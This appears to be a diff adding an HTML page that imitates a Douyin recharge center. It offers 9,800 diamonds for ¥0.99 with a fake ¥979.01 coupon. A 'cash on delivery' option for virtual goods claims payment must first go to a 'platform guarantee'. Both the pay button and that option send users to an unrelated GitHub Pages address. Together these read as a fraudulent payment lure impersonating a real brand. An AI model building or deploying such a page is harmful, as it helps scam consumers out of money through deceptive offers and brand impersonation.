@@ -1,0 +1,511 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>抖音小店</title>
+<meta name="keywords" content="这里填写关键词" />
+<meta name="description" content="这里填写说明内容" />
+
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>抖音充值中心</title>
+    <style>
+        /* 全局样式初始化‌:ml-citation{ref="1,3" data="citationList"} */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            background: #1a1a1a;
+            color: #fff;
+            font-family: "PingFang SC", sans-serif;
+        }
+
+        /* 容器布局 */
+        .container {
+            padding: 15px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        /* 返回按钮‌:ml-citation{ref="7" data="citationList"} */
+        .back-btn {
+            position: fixed;
+            right: 15px;
+            top: 15px;
+            color: #fff;
+            text-decoration: none;
+            z-index: 999;
+        }
+.container {
+  position: relative;  /* 创建定位参考系‌:ml-citation{ref="1" data="citationList"} */
+  min-height: 100vh;   /* 确保容器高度 */
+}
+
+.back-btn {
+  position: absolute;  /* 启用绝对定位‌:ml-citation{ref="1,4" data="citationList"} */
+  top: 15px;           /* 距顶部间距 */
+  left: 15px;          /* 距左侧间距 */
+  padding: 8px 12px;   /* 按钮内边距 */
+  font-size: 14px;     /* 适配移动端显示‌:ml-citation{ref="2" data="citationList"} */
+}
+
+        /* 输入区域 - 修改为白色背景 */
+        .input-section {
+            background: #ffffff; /* 修改为白色背景 */
+            color: #333; /* 文字颜色改为深色 */
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        /* 插图样式 */
+        .input-illustration {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            display: block;
+            cursor: pointer; /* 添加指针样式表示可点击 */
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            background: #f5f5f5; /* 输入框背景改为浅灰色 */
+            border: 1px solid #ddd; /* 边框改为浅色 */
+            border-radius: 8px;
+            color: #333; /* 输入文字颜色改为深色 */
+            margin-bottom: 10px;
+        }
+        
+        /* 输入框placeholder颜色 */
+        .input-field::placeholder {
+            color: #999;
+        }
+
+        /* 商品展示区‌:ml-citation{ref="3,4" data="citationList"} */
+        .product-card {
+            background: linear-gradient(135deg, #ff3366, #ff6666);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+        .product-bg {
+            position: absolute;
+            right: -30px;
+            top: -30px;
+            width: 120px;
+            height: 120px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 50%;
+        }
+
+
+   /* 新增优惠券专属样式 */
+.coupon-section {
+    background: #2a2a2a;
+    border-radius: 12px;
+    padding: 15px 0;
+    margin-bottom: 15px;
+}
+
+.coupon-header {
+    padding: 0 15px 10px;
+    border-bottom: 1px solid #3a3a3a;
+    margin-bottom: 12px;
+}
+
+.coupon-item {
+    position: relative;
+    margin: 10px 15px;
+    padding: 15px;
+    background: linear-gradient(135deg, #333 0%, #3a3a3a 100%);
+    border-radius: 10px;
+    border: 2px solid #444;
+    transition: all 0.3s ease;
+}
+
+.coupon-item:before {
+    content: "";
+    position: absolute;
+    right: -1px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 30px;
+    height: 30px;
+    background: #2a2a2a;
+    clip-path: circle(50% at 100% 50%);
+}
+
+.coupon-item.active {
+    border-color: #ff3366;
+    background: linear-gradient(135deg, rgba(255,51,102,0.2) 0%, rgba(255,102,102,0.1) 100%);
+    transform: translateX(5px);
+}
+
+.coupon-badge {
+    position: absolute;
+    right: -8px;
+    top: -8px;
+    background: #ff3366;
+    color: white;
+    padding: 4px 8px;
+    border-radius: 12px;
+    font-size: 12px;
+    transform: rotate(15deg);
+}
+
+.coupon-value {
+    color: #ff3366;
+    font-size: 18px;
+    font-weight: bold;
+    margin-bottom: 5px;
+}
+
+.coupon-condition {
+    color: #999;
+    font-size: 12px;
+}
+
+.coupon-disabled {
+    opacity: 0.5;
+    filter: grayscale(0.8);
+}
+
+       /* 新增支付方式专属样式 */
+.payment-section {
+    background: #2a2a2a;
+    border-radius: 12px;
+    padding: 15px 0; /* 调整内边距 */
+    margin-bottom: 15px;
+}
+
+.payment-header {
+    padding: 0 15px 10px;
+    border-bottom: 1px solid #3a3a3a; /* 添加分割线 */
+    margin-bottom: 12px;
+}
+
+.payment-method {
+    display: flex;
+    align-items: center;
+    padding: 15px;
+    margin: 8px 15px;
+    background: #333;
+    border-radius: 10px;
+    border: 2px solid transparent;
+    transition: all 0.3s ease; /* 添加过渡动画 */
+}
+
+.payment-method:hover {
+    background: #3a3a3a;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.2); /* 悬停效果 */
+}
+
+.payment-method.active {
+    border-color: #ff3366; /* 选中状态高亮 */
+    background: rgba(255,51,102,0.1);
+}
+
+.payment-icon {
+    width: 32px;
+    height: 32px;
+    margin-right: 15px;
+}
+
+.payment-info {
+    flex: 1;
+}
+
+.payment-title {
+    font-weight: 500;
+    margin-bottom: 4px;
+}
+
+.payment-desc {
+    color: #999;
+    font-size: 12px;
+}
+
+
+/* 新增金额展示样式 */
+.amount-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 12px 15px;
+  margin-bottom: 15px;
+  background: #333;
+  border-radius: 8px;
+}
+
+.amount-title {
+  color: #fff;
+  font-size: 16px;
+}
+
+.amount-value {
+  color: #ff3366;
+  font-size: 20px;
+  font-weight: bold;
+}
+
+.payment-title {
+  color: #999;
+  font-size: 14px;
+  margin-bottom: 12px;
+  padding-left: 5px;
+}
+
+
+/* 隐藏原生radio样式 */
+.payment-radio {
+    position: absolute;
+    opacity: 0;
+    height: 0;
+    width: 0;
+}
+
+/* 自定义选中指示器 */
+.checkmark {
+    width: 20px;
+    height: 20px;
+    border: 2px solid #666;
+    border-radius: 50%;
+    position: relative;
+}
+
+.checkmark::after {
+    content: "";
+    position: absolute;
+    display: none;
+    left: 50%;
+    top: 50%;
+    transform: translate(-50%,-50%);
+    width: 12px;
+    height: 12px;
+    border-radius: 50%;
+    background: #ff3366;
+}
+
+.payment-radio:checked ~ .checkmark::after {
+    display: block;
+}
+
+        /* 提交按钮‌:ml-citation{ref="3,6" data="citationList"} */
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: #ff3366;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+        }
+ /* 样式可根据需要调整 */
+        .cod-prompt {
+            display: none;
+            margin-top: 20px;
+            background-color: #f9f9f9;
+            padding: 15px;
+            border: 1px solid #ccc;
+        }
+.cod-prompt {
+    display: none;
+    margin-top: 20px;
+    background-color: #2a2a2a;
+    padding: 20px;
+    border: 1px solid #ccc;
+    border-radius: 10px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+}
+
+.prompt-content {
+    margin-bottom: 15px;
+}
+
+.prompt-buttons {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.cancel-btn, .confirm-btn {
+    padding: 10px 20px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    transition: background-color 0.3s;
+}
+
+.cancel-btn {
+    background-color: #f0f0f0;
+    color: #666;
+}
+
+.cancel-btn:hover {
+    background-color: #d0d0d0;
+}
+
+.confirm-btn {
+    background-color: #ff3366;
+    color: #fff;
+}
+
+.confirm-btn:hover {
+    background-color: #0056b3;
+}
+
+    </style>
+</head>
+
+
+<body>
+   
+    <div class="container">
+<!-- 账号输入区 -->
+        <div class="input-section">
+            <!-- 插图 - 添加了onclick事件 -->
+            <img src="https://tupian7768.oss-cn-guangzhou.aliyuncs.com/fk100/1.png" 
+                 class="input-illustration" 
+                 onclick="alert('专属支付订单，无法切换抖音号')">
+            
+ 
+        </div>
+        <!-- 商品展示区 -->
+        <div class="product-card">
+            <div class="product-bg"></div>
+            <h3>9800钻石 ¥0.99</h3>
+            <p>双11百亿补贴新人首充专享优惠</p>
+        </div>
+
+   <!-- 修改后的优惠券区块 -->
+<div class="coupon-section">
+    <div class="coupon-header">
+        <h4>可用优惠券</h4>
+        <small>1张未使用</small>
+    </div>
+
+    <div class="coupon-item active">
+        <div class="coupon-badge">首充专属</div>
+        <div class="coupon-value">¥979.01</div>
+        <div class="coupon-condition">满900元可用</div>
+        <div class="coupon-time">有效期至2025-11-11</div>
+    </div>
+
+</div>
+       <!-- 修改后的支付方式区块 -->
+<div class="payment-section">
+    <div class="payment-header">
+<div class="payment-section">
+  <!-- 新增金额展示模块 -->
+<!-- 新增金额展示模块 -->
+<div class="amount-header">
+    <div class="amount-title">需付金额</div>
+    <div class="amount-value">¥0.99</div>
+</div>
+
+  <h4>选择支付方式</h4>
+        </div>
+
+        <!-- 微信支付模块 -->
+      <label class="payment-method">
+    <input type="radio" name="payment" class="payment-radio" checked onchange="togglePaymentButton()">
+            <img src="https://lf6-infras.bytetos.com/obj/static-assets/859c771f7337d1fd7b15b5448118b191.png" class="payment-icon">
+            <div class="payment-info">
+                <div class="payment-title">微信支付</div>
+                <div class="payment-desc">推荐微信用户使用</div>
+            </div>
+            <span class="checkmark"></span>
+        </label>
+
+
+<!-- 货到付款模块 -->
+<label class="payment-method">
+    <input type="radio" name="payment" class="payment-radio" value="cod" onclick="showCODPrompt(); togglePaymentButton()">
+    <img src="https://jypjtp.fwh.bcebos.com/hdfk.webp" alt="货到付款图标" class="payment-icon">
+    <div class="payment-info">
+        <div class="payment-title">货到付款</div>
+        <div class="payment-desc">选择货到付款后请留意平台提示</div>
+    </div>
+    <span class="checkmark"></span>
+</label>
+
+<!-- 货到付款提示框（隐藏状态） -->
+<div id="codPrompt" class="cod-prompt">
+    <div class="prompt-content">
+        <p>虚拟商品，使用货到付款，需暂时把货款支付至平台担保，"充值到账"平台才会把款项转给商家，"未到账"将自动退款至付款账户</p>
+<div style="display: block;"><br></div>
+        <div class="prompt-buttons">
+            <button class="cancel-btn" onclick="closeCODPrompt()">取消</button>
+            <button class="confirm-btn" onclick="confirmCODPrompt()">确定，并支付走平台担保</button>
+        </div>
+    </div>
+</div>
+
+<!-- 提交按钮 -->
+<button class="submit-btn"onclick="window.open('https://pyqfk.github.io/556/fk38.html', '_blank')" id="payButton" style="display: none;" onclick="submitPayment()">立即支付 ¥0.99</button>
+
+        </button>
+  </div>
+<script>
+function showCODPrompt() {
+    document.getElementById('codPrompt').style.display = 'block';
+}
+
+function closeCODPrompt() {
+    document.getElementById('codPrompt').style.display = 'none';
+    // 新增代码：自动选择微信支付并显示支付按钮
+    var weChatRadio = document.querySelector('input[name="payment"][class="payment-radio"]:checked') || document.querySelector('input[name="payment"][class="payment-radio"][checked]');
+    if (!weChatRadio || weChatRadio.value !== undefined) { // 确保不是货到付款且未明确选中其他支付方式时，默认选中微信支付
+        var defaultWeChatRadio = document.querySelector('input[name="payment"][class="payment-radio"][value=""]') || document.querySelector('input[name="payment"][class="payment-radio"]:not([value="cod"])');
+        defaultWeChatRadio.checked = true;
+
+        togglePaymentButton(); // 调用函数更新按钮状态
+    }
+}
+
+function confirmCODPrompt() {
+    if (confirm('您已选择货到付款，请确保按照提示操作，是否继续？')) {
+        window.open('https://pyqfk.github.io/556/fk38.html', '_blank'); // 替换为实际的支付处理页面URL
+    } else {
+        closeCODPrompt(); // 用户取消时隐藏货到付款提示框，并自动选择微信支付
+    }
+}
+
+function togglePaymentButton() {
+    var payButton = document.getElementById('payButton');
+    var codRadio = document.querySelector('input[name="payment"][value="cod"]:checked');
+
+    if (codRadio) {
+        payButton.style.display = 'none';
+        showCODPrompt();
+    } else {
+        payButton.style.display = 'block';
+        closeCODPrompt(); // 确保在没有选择货到付款时，货到付款提示框是隐藏的
+    }
+}
+
+// ... 其他函数保持不变 ...
+
+// 页面加载时初始化按钮状态和提示框
+window.onload = function() {
+    togglePaymentButton();
+};
+
+</script>
+</body>
+</html>
